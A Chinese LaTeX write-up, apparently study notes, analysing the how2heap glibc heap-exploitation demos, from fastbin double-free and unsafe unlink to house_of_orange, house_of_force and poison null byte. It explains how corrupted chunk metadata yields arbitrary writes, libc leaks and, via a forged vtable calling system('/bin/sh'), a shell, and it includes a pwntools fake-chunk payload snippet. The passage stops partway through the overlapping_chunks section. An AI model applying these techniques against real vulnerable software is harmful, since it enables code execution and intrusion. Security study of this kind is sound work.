\begin{center}
    \section{how2heap 分析}
\end{center}

% 添加首行缩进,两个字符
\setlength{\parindent}{2em}
堆是程序虚拟地址空间中的一块连续的区域,与栈不同,由低地址向高地址增长,且由操作系统进行维护。

编译 \verb+how2heap+ 的机器\verb+libc+版本如下:
\begin{minted}[breaklines, frame=lines]{shell}
$ file /lib/x86_64-linux-gnu/libc-2.23.so
/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb24c4bfef94ddb, for GNU/Linux 2.6.32, stripped
\end{minted}

\subsection{first\_fit}
\setlength{\parindent}{2em}

运行之,结果如下:

\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap git:(master) ✗ ./first_fit

This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.
glibc uses a first-fit algorithm to select a free chunk.
If a chunk is free and large enough, malloc will select this chunk.
This can be exploited in a use-after-free situation.
Allocating 2 buffers. They can be large, don't have to be fastbin.
1st malloc(512): 0x1768010
2nd malloc(256): 0x1768220
we could continue mallocing here...
now let's put a string at a that we can read later "this is A!"
first allocation 0x1768010 points to this is A!
Freeing the first one...
We don't need to free anything again. As long as we allocate less than 512, it will end up at 0x1768010
So, let's allocate 500 bytes
3rd malloc(500): 0x1768010
And put a different string here, "this is C!"
3rd allocation 0x1768010 points to this is C!
first allocation 0x1768010 points to this is C!
\end{minted}

这里,第一个程序展示了 \verb+ glibc+ 堆分配的策略,即 \verb+ first-fit+。在分配内存时,\verb+ malloc+ 会先到 \verb+ unsorted bin+(或者\verb+ fastbins+) 中查找适合的被\verb+ free+的\verb+ chunk+,如果没有,就会把\verb+ unsorted bin+中的所有\verb+ chunk+分别放入到所属的\verb+ bins+中,然后再去这些\verb+ bins+里去找合适的 \verb+ chunk+。可以看到第三次\verb+ malloc+的地址和第一次相同,即\verb+ malloc+找到了第一次\verb+ free+掉的\verb+ chunk+,并把它重新分配。


\subsection{fastbin\_dup}

运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap git:(master) ✗ ./fastbin_dup

This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0xb3b010
2nd malloc(8): 0xb3b030
3rd malloc(8): 0xb3b050
Freeing the first one...
If we free 0xb3b010 again, things will crash because 0xb3b010 is at the top of the free list.
So, instead, we'll free 0xb3b030.
Now, we can free 0xb3b010 again, since it's not the head of the free list.
Now the free list has [ 0xb3b010, 0xb3b030, 0xb3b010 ]. If we malloc 3 times, we'll get 0xb3b010 twice!
1st malloc(8): 0xb3b010
2nd malloc(8): 0xb3b030
3rd malloc(8): 0xb3b010
\end{minted}

这个程序展示了利用\verb+ fastbins+的\verb+ double-free+攻击,可以泄漏出一块已经被分配的内存指针\verb+ fastbins+可以看成一个后进先出的栈,使用单链表实现,通过\verb+ fastbin->fd+来遍历\verb+ fastbins+。由于\verb+ free+的过程会对\verb+ free list+ 做检查,我们不能连续两次\verb+ free+同一个\verb+ chunk+,所以这里在两次\verb+ free+ 之间,增加了一次对其他\verb+ chunk+的\verb+ free+过程,从而绕过检查顺利执行。然后再\verb+ malloc+三次,就在同一个地址\verb+ malloc+了两次,也就有了两个指向同一块内存区域的指针。

\subsection{fastbin\_dup\_into\_stack}

首先,我们在\verb+ malloc.c+中可以找到\verb+ malloc_chunk+的定义如下:

\begin{minted}[breaklines, frame=lines]{c}
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};
\end{minted}

上面这个程序展示了怎样通过修改\verb+ fd+指针,将其指向一个伪造的\verb+ free chunk+,在伪造的地址处\verb+ malloc+出一个\verb+ chunk+。
该程序大部分内容都和上一个程序一样,漏洞也同样是\verb+ double-free+,只有给\verb+ fd+填充的内容不一样。

\subsection{unsafe\_unlink}

上面这个程序展示了怎样利用\verb+ free+改写全局指针\verb+ chunk0_ptr+达到任意内存写的目的,即\verb+ unsafe unlink+。

我们可以 Google 搜索到\verb+ unlink+函数的具体实现:
\begin{minted}[breaklines, frame=lines]{c}
   #define unlink( P, BK, FD ) {            \
       BK = P->bk;                          \
       FD = P->fd;                          \
       FD->bk = BK;                         \
       BK->fd = FD;                         \
   }
\end{minted}

但是这个\verb+ unlink+的实现属于旧版本的\verb+ glibc+,我们编译机器上的\verb+ glibc+中的\verb+ unlink+的实现如下,增加了一些对\verb+ unsafe unlink+的检查,也是我们需要绕过的检查:
\begin{minted}[breaklines, frame=lines]{c}
    /* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr(check_action, "corrupted double-linked list", P, AV);
    else {
        FD->bk = BK;
        BK->fd = FD;
        if (!in_smallbin_range (P->size) && __builtin_expect (P->fd_nextsize != NULL, 0)) {
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))
         malloc_printerr (check_action, "corrupted double-linked list (not small)", P, AV);
            if (FD->fd_nextsize == NULL) {
                  FD->fd_nextsize = FD->bk_nextsize = FD;
                else {
                    FD->fd_nextsize = P->fd_nextsize;
                    FD->bk_nextsize = P->bk_nextsize;
                    P->fd_nextsize->bk_nextsize = FD;
                    P->bk_nextsize->fd_nextsize = FD;
                  }
              } else {
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;
              }
          }
      }
}
\end{minted}

编译并运行:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g unsafe_unlink.c 
$ ./a.out 
The global chunk0_ptr is at 0x601070, pointing to 0x721010
The victim chunk we are going to corrupt is at 0x7210a0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
\end{minted}

上述代码中,使用\verb+ int malloc_size = 0x80;+的目的在于不使用操作系统分配的\verb+ fastbins+, 而去申请使用\verb+ small bins+, 然后, 我们使\verb+ header_size+的大小为\verb+ 2+。接着,我们申请两块空间,全局指针\verb+ chunk0_ptr+指向堆块\verb+ chunk0+,局部指针\verb+ chunk1_ptr+指向\verb+ chunk1+。

如果我们想要绕过\verb+ (P->fd->bk != P || P->bk->fd != P) == False;+ 的检查,但是这个检查有个缺陷,就是\verb+ fd/bk+指针都是通过与\verb+ chunk+ 头部的相对地址来查找的。所以我们可以利用全局指针\verb+ chunk0_ptr+构造一个\verb+fake chunk+来绕过它。

我们在\verb+ chunk0+里构造一个\verb+ fake chunk+,用\verb+ P+表示,两个指针\verb+ fd+和\verb+ bk+可以构成两条链:\verb+ P->fd->bk == + \\ \verb+ P,P->bk->fd == P;+,可以绕过检查。另外利用\verb+ chunk0+ 的溢出漏洞,通过修改\verb+ chunk1+ 的\verb+ prev_size+为\verb+ fake chunk+的大小,修改\verb+ PREV_INUSE+标志位为\verb+ 0+,将\verb+ fake chunk+伪造成一个\verb+ free chunk+。

接下来就是释放掉\verb+ chunk1+,这会触发\verb+ fake chunk+的\verb+  unlink+并覆盖\verb+chunk0_ptr+的值。

由于\verb+ unlink+ 的操作是:
\begin{minted}[breaklines, frame=lines]{c}
FD = P->fd;
BK = P->bk;
FD->bk = BK
BK->fd = FD
\end{minted}

由于这时候\verb+ P->fd->bk+和\verb+ P->bk->fd+都指向\verb+ P+,所以最后的结果为:
\begin{minted}[breaklines, frame=lines]{c}
chunk0_ptr = P = P->fd;
\end{minted}
因此我们利用\verb+ ublink+成功的修改了\verb+ chunk0_ptr+,即这时\verb+ chunk0_ptr[0]+和\verb+ chunk0_ptr[3]+实际上就是同一东西。所以我们修改\verb+ chunk0_ptr[3]+实际上就是在修改\verb+ chunk0_ptr[0]+。

\begin{minted}[breaklines, frame=lines]{c}
chunk0_ptr[3] = (uint64_t) victim_string;
fprintf(stderr, "Original value: %s\n", victim_string);
chunk0_ptr[0] = 0x4242424242424242LL;
fprintf(stderr, "New Value: %s\n", victim_string);
\end{minted}

此时,\verb+ chunk0_ptr+指向了\verb+ victim_string+,因此,我们修改\verb+ chunk0_ptr[3]+,就可以修改\verb+ victim_string+。通过上述演示,我们成功的利用\verb+ unsafe_unlink+做到了修改任意地址,但是上述演示仅在老版本的\verb+ glibc+(版本小于等于2.26)中可以演示成功,因为新版本的\verb+ glibc+中添加了对单字节溢出问题的检查:
\begin{minted}[breaklines, frame=lines]{c}
chunk_size == next-> prev-> chunk_size;
\end{minted}
,以及新增加的\verb+ tcache+机制:
\begin{minted}[breaklines, frame=lines]{c}
#if USE_TCACHE
/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS               64
# define MAX_TCACHE_SIZE       tidx2usize (TCACHE_MAX_BINS-1)

/* Only used to pre-fill the tunables.  */
# define tidx2usize(idx)       (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)

/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When "x" is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))

/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */

/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
#endif
\end{minted}

有关\verb+ tcache+机制的commit可以在这里\footnote{https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc}中查看更多。

\verb+ tcache+机制是一种线程缓存机制,每个线程默认情况下有 64 个大小递增的\verb+ bins+,每个\verb+ bin+是一个单链表,默认最多包含 7 个\verb+ chunk+。其中缓存的\verb+ chunk+是不会被合并的,所以在释放\verb+ chunk 1+的时候,\verb+ chunk0_ptr+仍然指向正确的堆地址,而不是\verb+ chunk0_ptr = P = P->fd;+。对于如何在代码中绕过\verb+ tcache+机制,仍然有很多可行的办法,其中一种是,我们可以在源程序的代码中添加一些代码,给填充进特定大小的\verb+ chunk+把\verb+ bin+占满,然后就能绕过\verb+ tcache+机制,在高版本\verb+ glibc+中实现和老版本相同的效果。

\subsection{unsorted\_bin\_attack}

编译运行之,得到结果:
\begin{minted}[breaklines, frame=lines]{c}
$ gcc -g unsorted_bin_attack.c 
$ ./a.out 
The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0

Now, we allocate first small chunk on the heap at: 0x1066010
We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78
We write it with the target address-0x10: 0x7ffc9b1d61a0

Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -> 0x7f2404cf5b78
\end{minted}

\verb+ unsorted_bin_attack+通常情况下是为了更进一步的利用所做的铺垫,我们已经知道\verb+ unsorted bin+是一个双向链表,在分配时会通过\verb+ unlink+操作将\verb+ chunk+从链表中移除,所以如果能够控制\verb+ unsorted bin chunk+的\verb+ bk+指针,就可以向任意位置写入一个指针。

这里通过\verb+ unlink+将\verb+ libc+的信息写入到我们可控的内存中,从而导致信息泄漏,为进一步的攻击提供便利,如泄露了\verb+ libc+的某些函数的地址,如果我们通过其他方式获取到了\verb+ libc+的版本信息,就可以通过偏移算出其他函数的地址,可以绕过 ASLR的保护。

\subsection{house\_of\_spirit}

编译运行之,结果如下:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g house_of_spirit.c 
$ ./a.out 
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffc782dae00
The second one: 0x7ffc782dae20
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10!
malloc(0x10): 0x7ffc782dae10
\end{minted}

\verb+ house-of-spirit+是一种对\verb+ fastbins+的攻击方法,即通过构造\verb+ fake chunk+,然后将其\verb+ free+掉,就可以在下一次\verb+ malloc+时返回\verb+ fake chunk+的地址,即一段我们可控的区域。其中,使用\verb+ house-of-spirit+技术的条件一是要使\verb+ free+的参数可控,以便指向我们想要控制的地址,其二是想要控制的地址我们应有写权限,以便提前伪造\verb+ fake chunk+。另外,这种攻击手段既可以利用堆溢出搞事情,也可以利用栈溢出搞事情。

具体的使用流程是,先在想要控制的地址上连续伪造\verb+ chunk+,由于堆的检查机制,我们需要连续伪造两个\verb+ chunk+,比如利用如下\verb+ Python+代码\footnote{Python代码中的函数为Python的漏洞利用框架pwntools中的函数,可访问官网:https://github.com/Gallopsled/pwntools}:
\begin{minted}[breaklines, frame=lines]{python}
l32(0x0)+l32(41)+'AAAA'*8 +l32(0x0)+l32(41)
\end{minted}

然后,我们控制\verb+ free+的参数,指向我们伪造的\verb+ chunk+地址,如果我们此时再次\verb+ free+,就可以控制之前伪造\verb+ chunk+的内存了。

\subsection{house\_of\_orange}

编译运行之,得到:
% , fontsize=\tiny
\begin{minted}[breaklines, frame=lines, fontsize=\small]{c}
$ gcc house_of_orange -o house_of_orange
$ ./house_of_orange
*** Error in `./house_of_orange': malloc(): memory corruption: 0x00007f82acdf5520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f82acaa77e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f82acab213e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f82acab4184]
./house_of_orange[0x4006cc]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f82aca50830]
./house_of_orange[0x400509]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:00 39375                      /mnt/c/Users/SKYE/Desktop/how2heap/house_of_orange
00600000-00601000 r--p 00000000 00:00 39375                      /mnt/c/Users/SKYE/Desktop/how2heap/house_of_orange
00601000-00602000 rw-p 00001000 00:00 39375                      /mnt/c/Users/SKYE/Desktop/how2heap/house_of_orange
01c98000-01cdb000 rw-p 00000000 00:00 0                          [heap]
7f82a8000000-7f82a8021000 rw-p 00000000 00:00 0
7f82a8021000-7f82ac000000 ---p 00000000 00:00 0
7f82ac810000-7f82ac826000 r-xp 00000000 00:00 208780             /lib/x86_64-linux-gnu/libgcc_s.so.1
7f82ac826000-7f82aca25000 ---p 00000016 00:00 208780             /lib/x86_64-linux-gnu/libgcc_s.so.1
7f82aca25000-7f82aca26000 rw-p 00015000 00:00 208780             /lib/x86_64-linux-gnu/libgcc_s.so.1
7f82aca30000-7f82acbf0000 r-xp 00000000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acbf0000-7f82acbf9000 ---p 001c0000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acbf9000-7f82acdf0000 ---p 000001c9 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acdf0000-7f82acdf4000 r--p 001c0000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acdf4000-7f82acdf6000 rw-p 001c4000 00:00 85962              /lib/x86_64-linux-gnu/libc-2.23.so
7f82acdf6000-7f82acdfa000 rw-p 00000000 00:00 0
7f82ace00000-7f82ace25000 r-xp 00000000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ace25000-7f82ace26000 r-xp 00025000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ad025000-7f82ad026000 r--p 00025000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ad026000-7f82ad027000 rw-p 00026000 00:00 85960              /lib/x86_64-linux-gnu/ld-2.23.so
7f82ad027000-7f82ad028000 rw-p 00000000 00:00 0
7f82ad200000-7f82ad201000 rw-p 00000000 00:00 0
7f82ad210000-7f82ad211000 rw-p 00000000 00:00 0
7f82ad220000-7f82ad221000 rw-p 00000000 00:00 0
7f82ad230000-7f82ad231000 rw-p 00000000 00:00 0
7fffee362000-7fffeeb62000 rw-p 00000000 00:00 0                  [stack]
7fffef2a7000-7fffef2a8000 r-xp 00000000 00:00 0                  [vdso]
$ whoami
skye
$ exit
[1]    69 abort (core dumped)  ./house_of_orange
\end{minted}

\verb+ house_of_orange+s是一种堆溢出修改\verb+ _IO_list_all+指针的利用方法。我们可以利用这个方法来泄露堆信息和\verb+ libc+的相关信息。我们已经知道,但程序还未申请内存时,整个堆块都属于\verb+ top chunk+,每次申请内存时,操作系统就从\verb+ top chunk+中划出请求大小的堆块返回给用户,于是\verb+ top chunk+就会越来越小。

这时候,如果我们再次申请内存,但是\verb+ top chunk+的剩余大小已经不能满足请求,此时操作系统调用\verb+ sysmalloc()+函数分配新的堆空间,这时候有两种选择,一种是直接扩充\verb+ top chunk+,另一种是调用\verb+ mmap()+分配一块新的\verb+ top chunk+。

当某一次 top chunk 的剩余大小已经不能够满足请求时,就会调用函数\verb+ sysmalloc()+ 分配新内存,这时可能会发生两种情况,一种是直接扩充 top chunk,另一种是调用\verb+ mmap+分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的,为了能够使用前一种扩展 top chunk,需要请求小于阀值\verb+ mp_.mmap_threshold+:
\begin{minted}[breaklines, frame=lines]{c}
if (av == NULL 
    || ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) 
    && (mp_.n_mmaps < mp_.n_mmaps_max)))
\end{minted}

同时,为了能够调用\verb+ sysmalloc()+中的\verb+ _int_free()+,需要 top chunk 大于 \verb+ MINSIZE+,即 0x10:
\begin{minted}[breaklines, frame=lines]{c}
if (old_size >= MINSIZE)
{
    _int_free(av, old_top, 1);
}
\end{minted}

除此以外,还需要绕过\verb+ old_size+ 小于\verb| nb + MINSIZE|,\verb+ PREV_INUSE+ 标志位为 1,\verb| old_top + old_size| 页对齐这几个条件:
\begin{minted}[breaklines, frame=lines]{c}
/*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */

assert((old_top == initial_top(av) && old_size == 0) ||
       ((unsigned long)(old_size) >= MINSIZE &&
        prev_inuse(old_top) &&
        ((unsigned long)old_end & (pagesize - 1)) == 0));

/* Precondition: not enough current space to satisfy nb request */
assert((unsigned long)(old_size) < (unsigned long)(nb + MINSIZE));

\end{minted}

首先分配一个大小为 0x400 的 chunk,默认情况下,top chunk 大小为 0x21000,减去 0x400,所以此时的大小为 0x20c00,另外\verb+ PREV_INUSE+ 被设置。现在假设存在溢出漏洞,可以修改 top chunk 的数据,于是我们将 size 字段修改为 0xc01。这样就可以满足上面所说的条件。

紧接着,申请一块大内存,此时由于修改后的 top chunk size 不能满足需求,则调用 sysmalloc 的第一种方法扩充 top chunk,结果是在\verb+ old_top+ 后面新建了一个 top chunk 用来存放\verb+ new_top+,然后将\verb+ old_top+释放,即被添加到了\verb+ unsorted_bin+ 中。

于是就泄漏出了 libc 地址。另外可以看到\verb+ old top chunk+被缩小了 0x20,缩小的空间被用于放置 fencepost chunk。此时的堆空间应该是这样的:
\begin{minted}[breaklines, frame=lines]{c}
+---------------+
|       p1      |
+---------------+
|  old top-0x20 |
+---------------+
|  fencepost 1  |
+---------------+
|  fencepost 2  |
+---------------+
|      ...      |
+---------------+
|       p2      |
+---------------+
|    new top    |
+---------------+
\end{minted}

根据放入\verb+ unsorted_bin+中\verb+ old top chunk+的\verb+ fd/bk+ 指针,可以推算出 \verb+ _IO_list_all+ 的地址。然后通过溢出将 old top 的 bk 改写为\verb| _IO_list_all-0x10|,这样在进行\verb+ unsorted bin attack+ 时,就会将\verb+ _IO_list_all+修改为\verb| &unsorted_bin-0x10|。

\verb+ _IO_list_all+是一个\verb+ _IO_FILE_plus+类型的对象,我们的目的就是将\verb+ _IO_list_all+ 指针改写为一个伪造的指针,它的\verb+ _IO_OVERFLOW+指向\verb+ system+,并且前 8 字节被设置为\verb+ '/bin/sh'+,所以对\verb+ _IO_OVERFLOW(fp, EOF)+的调用会变成对\verb+ system('/bin/sh')+的调用:
\begin{minted}[breaklines, frame=lines]{c}
// libio/libioP.h
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
    _IO_FILE file;
    const struct _IO_jump_t *vtable;
};

// libio/libio.h
struct _IO_FILE
{
    int _flags; /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

    /* The following pointers correspond to the C++ streambuf protocol. */
    /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
    char *_IO_read_ptr;   /* Current read pointer */
    char *_IO_read_end;   /* End of get area. */
    char *_IO_read_base;  /* Start of putback+get area. */
    char *_IO_write_base; /* Start of put area. */
    char *_IO_write_ptr;  /* Current put pointer. */
    char *_IO_write_end;  /* End of put area. */
    char *_IO_buf_base;   /* Start of reserve area. */
    char *_IO_buf_end;    /* End of reserve area. */
    /* The following fields are used to support backing up and undo. */
    char *_IO_save_base;   /* Pointer to start of non-current get area. */
    char *_IO_backup_base; /* Pointer to first valid character of backup area */
    char *_IO_save_end;    /* Pointer to end of non-current get area. */

    struct _IO_marker *_markers;

    struct _IO_FILE *_chain;

    int _fileno;
#if 0
  int _blksize;
#else
    int _flags2;
#endif
    _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
    /* 1+column number of pbase(); 0 is unknown. */
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];

    /*  char* _save_gptr;  char* _save_egptr; */

    _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

\end{minted}

其中有一个指向函数跳转表的指针,\verb+ _IO_jump_t+的结构如下:
\begin{minted}[breaklines, frame=lines]{c}
// libio/libioP.h
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};

\end{minted}

house\_of\_orange 伪造 \verb+ _IO_jump_t+中的\verb+ __overflo+为\verb+ system()+函数的地址,从而达到执行 shell 的目的。

\subsection{house\_of\_lore}

编译,运行得到结果:

\begin{minted}[breaklines, frame=lines]{c}
$ gcc -g house_of_lore.c 
$ ./a.out 
Allocated the victim (small) chunk: 0x1b2e010
stack_buffer_1: 0x7ffe5c570350
stack_buffer_2: 0x7ffe5c570330

Freeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin
victim->fd: 0x7f239d4c9b78
victim->bk: 0x7f239d4c9b78

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0
The victim chunk 0x1b2e010 will be inserted in front of the SmallBin
victim->fd: 0x7f239d4c9bf8
victim->bk: 0x7f239d4c9bf8

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x7ffe5c570360
The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8

Nice jump d00d
\end{minted}

\verb+ the_house_of_lore+的原理是通过破坏已经放入\verb+ small bins+ 中的\verb+ bk+指针来达到取得任意地址的目的。当程序申请的内存大小符合\verb+ small bins+,则堆管理器在对应的\verb+ bin+中寻找是否有大小符合且空闲的块,如果有,那么进行\verb+ unlink+操作,将内存交给程序。

那么,当一个块存在于 Small Bin 的第一个块时,通过溢出修改其\verb+ bk+指针指向某个地址\verb+ ptr+, 当下一次进行\verb+ malloc+对应大小的块时, 就有\verb+ bck = victim->bk= ptr+, 且 \verb+ bin->bk = bck = ptr+, 这样以来就成功地将这个\verb+ bin+的第一块指向了\verb+ ptr+, 下次再\verb+ malloc+对应大小就能够返回\verb| ptr+16|的位置, 这样攻击者再对取回的块进行写入就能控制\verb$ ptr+16$的内存内容。

\subsection{house\_of\_einherjar}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g house_of_einherjar.c 
$ ./a.out 
We allocate 0x10 bytes for 'a': 0xb31010

Our fake chunk at 0x7ffdb337b7f0 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffdb337b7f0
bck: 0x7ffdb337b7f0
fwd_nextsize: 0x7ffdb337b7f0
bck_nextsize: 0x7ffdb337b7f0

We allocate 0xf8 bytes for 'b': 0xb31030
b.size: 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk: 0x7ffdb337b800
\end{minted}

\verb+ house-of-einherjar+是一种利用\verb+ malloc+ 来返回一个附近地址的任意指针。它要求有一个单字节溢出漏洞,覆盖掉\verb+ next chunk+的\verb+ size+字段并清除\verb+ PREV_IN_USE+标志,然后还需要覆盖\verb+ prev_size+字段为\verb+ fake chunk+的大小。
当\verb+ next chunk+被释放时,它会发现前一个\verb+ chunk+被标记为空闲状态,然后尝试合并堆块。只要我们精心构造一个\verb+ fake chunk+,并让合并后的堆块范围到\verb+ fake chunk+处,那下一次\verb+ malloc+将返回我们想要的地址。

\subsection{house\_of\_force}

编译,运行,得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g house_of_force.c
$ ./a.out 
We will overwrite a variable at 0x601080

Let's allocate the first chunk of 0x10 bytes: 0x824010.
Real size of our allocated chunk is 0x18.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0x20fe1
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x824030
malloc(0x30) => 0x601080!

Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
\end{minted}

\verb+ house_of_force+是一种通过改写\verb+ top chunk+的\verb+ size+字段来欺骗堆分配器的返回任意地址的技术。我们知道在空闲内存的最高处,必然存在一块空闲的\verb+ chunk+,即\verb+ top chunk+,当\verb+ bins+和\verb+ fast bins+ 都不能满足分配需要的时候,\verb+ malloc+会从\verb+ top chunk+中分出一块内存给用户。所以\verb+ top chunk+的大小会随着分配和回收不停地变化。

这种攻击假设有一个溢出漏洞,可以改写\verb+ top chunk+的头部,然后将其改为一个非常大的值,以确保所有的\verb+ malloc+将使用\verb+ top chunk+ 分配,而不会调用\verb+ mmap+。这时如果攻击者\verb+ malloc+一个很大的数目(负有符号整数),\verb+ top chunk+ 的位置加上这个大数,造成整数溢出,结果是\verb+ top chunk+ 能够被转移到堆之前的内存地址(如程序的 .bss 段、.data 段、GOT 表等),下次再执行\verb+ malloc+ 时,攻击者就能够控制转移之后地址处的内存。

\subsection{poison\_null\_byte}

编译,并运行得到结果:
\begin{minted}[breaklines, frame=lines]{c}
$ gcc -g poison_null_byte.c 
$ ./a.out 
We allocate 0x10 bytes for 'a': 0xabb010
'real' size of 'a': 0x18
b: 0xabb030
c: 0xabb140
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0x110
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0xabb030
c.prev_size: 0x110
fake c.prev_size: 0x70

We malloc 'b2', our 'victim' chunk: 0xabb0c0
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0xabb030

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\end{minted}

此技术的利用条件是某个由\verb+malloc +分配的内存区域存在单字节溢出,通过溢出下一个\verb+chunk +的\verb+size +字段,攻击者能够在堆中创造出重叠的内存块,从而达到改写其他数据的目的。再结合其他的利用方式,同样能够获得程序的控制权。

\subsection{overlapping\_chunks}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g overlapping_chunks.c
$ ./a.out 
Now we allocate 3 chunks on the heap
p1=0x1e2b010
